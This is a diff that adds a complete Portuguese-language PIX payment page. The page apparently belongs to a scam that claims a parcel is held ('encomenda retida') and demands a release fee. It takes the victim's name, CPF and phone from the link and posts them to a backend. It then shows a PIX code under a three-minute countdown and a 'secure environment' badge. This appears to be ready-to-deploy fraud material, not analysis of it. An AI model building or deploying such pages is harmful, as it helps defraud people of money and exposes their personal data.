@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pagamento PIX</title>
+
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;background:#f3f4f6;min-height:100vh}
+  .top-bar{background:#fff;border-bottom:1px solid #e5e7eb;padding:12px 0;}
+  .top-bar-content{max-width:1200px;margin:0 auto;padding:0 16px;display:flex;justify-content:space-between;align-items:center}
+  .logo{height:32px}
+  .secure-badge{display:flex;align-items:center;color:#FA0000;font-size:14px;font-weight:500}
+  .secure-badge svg{margin-right:8px}
+
+  .container{max-width:28rem;margin:0 auto;padding:16px}
+  .card{background:#fff;border-radius:8px;box-shadow:0 4px 6px -1px rgba(0,0,0,.1);padding:24px;margin-top:16px}
+  .text-center{text-align:center}
+  .title{font-size:24px;font-weight:bold;margin-bottom:16px}
+
+  .info-box{background:#eff6ff;border:1px solid #dbeafe;border-radius:8px;padding:16px;margin-bottom:24px}
+  .info-box p{color:#1e40af;font-size:14px}
+
+  .pix-value{margin-bottom:12px;text-align:center}
+  .pix-value p{margin:0}
+  .pix-amount{color:#FA0000;font-size:24px;font-weight:bold;margin-top:4px}
+
+  .countdown{color:#6b7280;font-size:14px;text-align:center;margin:8px 0 16px}
+  .expired{opacity:.2;filter:grayscale(1)}
+
+  .pix-input{width:100%;padding:12px;border:1px solid #d1d5db;border-radius:8px;background:#f9fafb;color:#6b7280;margin:12px 0 8px;font-size:12px}
+  .copy-button{width:100%;padding:12px;border:none;border-radius:8px;background:#FA0000;color:#fff;font-weight:500;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:background-color .2s}
+  .copy-button:hover{background:#d10000}
+  .copy-button[disabled]{background:#111827;opacity:.9;cursor:pointer}
+
+  .instructions{margin-top:24px}
+  .instruction-item{display:flex;align-items:flex-start;gap:12px;margin-bottom:16px}
+  .instruction-item svg{flex-shrink:0;color:#6b7280}
+  .instruction-text{color:#6b7280}
+
+  .divider{border-top:1px solid #e5e7eb;margin:24px 0}
+  .small{color:#6b7280;font-size:14px}
+
+  .loading{display:flex;flex-direction:column;align-items:center;gap:16px;padding:40px 0}
+  .spinner{border:4px solid #f3f4f6;border-top:4px solid #FA0000;border-radius:50%;width:48px;height:48px;animation:spin 1s linear infinite}
+  @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+  .hidden{display:none}
+</style>
+</head>
+
+<body>
+  <div class="top-bar">
+    <div class="top-bar-content">
+      <img src="images/logo.png" alt="Logo" class="logo">
+      <div class="secure-badge">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <path d="M9 12l2 2 4-4"></path>
+          <path d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+        </svg>
+        <span>Ambiente seguro</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="container">
+    <div class="card">
+      <div class="text-center">
+        <h1 class="title">Tarifa Produto</h1>
+      </div>
+
+      <div class="info-box" style="text-align:center;">
+        <p>Sua encomenda está Retida</p>
+      </div>
+
+      <div class="pix-value">
+        <p style="color:#545454;">Valor do PIX: Taxa EMEX + Liberação</p>
+        <p class="pix-amount" id="valorDisplay">R$ 0,00</p>
+      </div>
+
+      <!-- Loading -->
+      <div id="loading" class="loading">
+        <div class="spinner"></div>
+        <p style="color:#6b7280;">Gerando código PIX...</p>
+      </div>
+
+      <!-- Conteúdo PIX (oculto inicialmente) -->
+      <div id="pixContent" class="hidden">
+        <div class="countdown">Expira em: <strong id="countdown">03:00</strong></div>
+
+        <div id="qr-container" style="text-align:center; margin:20px 0;">
+          <img id="qrImg" src="" alt="QR Code PIX" style="display:block; margin:20px auto; max-width:300px;">
+          <input type="text" class="pix-input" value="" readonly id="pixCopiaCola">
+          <button id="copyButton" class="copy-button">Copiar código</button>
+        </div>
+
+        <div class="instructions">
+          <h2 class="title" style="font-size:20px;margin-bottom:12px">Pagar seu pedido com PIX</h2>
+          <div class="instruction-item">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><path d="M12 18h.01"></path>
+            </svg>
+            <p class="instruction-text">Copie o código acima.</p>
+          </div>
+          <div class="instruction-item">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <path d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path><path d="M9 12l2 2 4-4"></path>
+            </svg>
+            <p class="instruction-text">Selecione a opção PIX Copia e Cola no aplicativo onde você tem o PIX habilitado.</p>
+          </div>
+        </div>
+
+        <div class="divider"></div>
+        <div class="small" style="text-align:center">
+          Nome: <strong id="nomeDisplay">-</strong> • CPF: <strong id="cpfDisplay">-</strong>
+        </div>
+      </div>
+    </div>
+  </div>
+
+<script>
+  // --- CAPTURAR DADOS DA URL ---
+  function getUrlParams() {
+    const params = new URLSearchParams(window.location.search);
+    return {
+      nome: params.get('nome') || '',
+      cpf: params.get('cpf') || '',
+      email: params.get('email') || 'cliente@email.com',
+      telefone: params.get('telefone') || '11999999999',
+      value: params.get('value') || '0'
+    };
+  }
+
+  // --- FORMATAR VALOR ---
+  function formatarValor(valor) {
+    const num = parseInt(valor) / 100;
+    return num.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+  }
+
+  // --- FORMATAR CPF ---
+  function formatarCPF(cpf) {
+    return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+  }
+
+  const clienteData = getUrlParams();
+  let _expired = false;
+  let tentativas = 0;
+  const MAX_TENTATIVAS = 3;
+
+  // Atualizar valor na tela
+  document.getElementById('valorDisplay').textContent = formatarValor(clienteData.value);
+
+  // --- GERAR PIX ---
+  async function gerarPix() {
+    tentativas++;
+    
+    if (tentativas > MAX_TENTATIVAS) {
+      document.getElementById('loading').innerHTML = `
+        <p style="color:#dc2626;font-weight:500;">Erro ao gerar PIX após ${MAX_TENTATIVAS} tentativas.</p>
+        <p style="color:#6b7280;font-size:14px;margin-top:8px;">Por favor, contate o suporte.</p>
+      `;
+      return;
+    }
+
+    try {
+      const formData = new FormData();
+      formData.append('nome', clienteData.nome);
+      formData.append('cpf', clienteData.cpf);
+      formData.append('email', clienteData.email);
+      formData.append('telefone', clienteData.telefone);
+
+      const response = await fetch('pagamento.php', {
+        method: 'POST',
+        body: formData
+      });
+
+      const data = await response.json();
+
+      if (!data.success) {
+        console.error('Erro da API:', data);
+        
+        let errorMsg = 'Não foi possível gerar o código PIX.';
+        
+        if (data.refused) {
+          errorMsg = data.error || 'Pagamento recusado pela operadora.';
+        } else if (data.error) {
+          errorMsg = data.error;
+        }
+        
+        document.getElementById('loading').innerHTML = `
+          <div style="text-align:center;">
+            <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#dc2626" stroke-width="2" style="margin:0 auto 16px">
+              <circle cx="12" cy="12" r="10"></circle>
+              <line x1="12" y1="8" x2="12" y2="12"></line>
+              <line x1="12" y1="16" x2="12.01" y2="16"></line>
+            </svg>
+            <p style="color:#dc2626;font-weight:500;margin-bottom:8px;">${errorMsg}</p>
+            <button onclick="location.reload()" style="margin-top:16px;padding:10px 20px;background:#FA0000;color:#fff;border:none;border-radius:6px;cursor:pointer;font-weight:500;">
+              Tentar novamente
+            </button>
+          </div>
+        `;
+        return;
+      }
+
+      // Atualizar interface
+      document.getElementById('loading').classList.add('hidden');
+      document.getElementById('pixContent').classList.remove('hidden');
+
+      // Atualizar dados do cliente na tela
+      document.getElementById('nomeDisplay').textContent = clienteData.nome;
+      document.getElementById('cpfDisplay').textContent = formatarCPF(clienteData.cpf);
+
+      // Atualizar QR Code
+      const qrcode = data.qrcode;
+      const qrImg = document.getElementById('qrImg');
+      qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(qrcode)}`;
+
+      // Atualizar código copia e cola
+      document.getElementById('pixCopiaCola').value = qrcode;
+
+      // Iniciar timer
+      iniciarTimer();
+
+    } catch (error) {
+      console.error('Erro:', error);
+      document.getElementById('loading').innerHTML = `
+        <div style="text-align:center;">
+          <p style="color:#dc2626;font-weight:500;margin-bottom:8px;">Erro de conexão</p>
+          <p style="color:#6b7280;font-size:14px;margin-bottom:16px;">Verifique sua internet e tente novamente.</p>
+          <button onclick="location.reload()" style="padding:10px 20px;background:#FA0000;color:#fff;border:none;border-radius:6px;cursor:pointer;font-weight:500;">
+            Tentar novamente
+          </button>
+        </div>
+      `;
+    }
+  }
+
+  // --- COPIAR código ---
+  document.getElementById("copyButton").onclick = async function(){
+    try{
+      const el = document.getElementById("pixCopiaCola");
+      el.select(); 
+      el.setSelectionRange(0, 99999);
+      await navigator.clipboard.writeText(el.value);
+      this.innerText = "✓ Copiado!";
+      setTimeout(()=> this.innerText = "Copiar código", 1500);
+    }catch(e){
+      document.execCommand('copy');
+      this.innerText = "✓ Copiado!";
+      setTimeout(()=> this.innerText = "Copiar código", 1500);
+    }
+  };
+
+  // --- TIMER 3min ---
+  function iniciarTimer(){
+    let total = 3 * 60; // 180 segundos
+    const countdownEl = document.getElementById("countdown");
+    const qrImg = document.getElementById("qrImg");
+    const input = document.getElementById("pixCopiaCola");
+    const btn = document.getElementById("copyButton");
+
+    function fmt(s){
+      const m = Math.floor(s/60).toString().padStart(2,"0");
+      const r = (s%60).toString().padStart(2,"0");
+      return m + ":" + r;
+    }
+
+    function tick(){
+      countdownEl.textContent = fmt(total);
+      
+      if (total <= 0){
+        _expired = true;
+        if (qrImg) qrImg.classList.add("expired");
+        if (input) {
+          input.value = "Código Pix Expirado";
+          input.readOnly = true;
+        }
+        if (btn) {
+          btn.textContent = "Gerar novamente";
+          btn.disabled = false;
+          btn.onclick = function(){
+            window.location.reload();
+          };
+        }
+        return;
+      }
+      
+      total--;
+      setTimeout(tick, 1000);
+    }
+    tick();
+  }
+
+  // --- INICIAR ao carregar a página ---
+  window.addEventListener('DOMContentLoaded', gerarPix);
+</script>
+
+</body>
+</html>
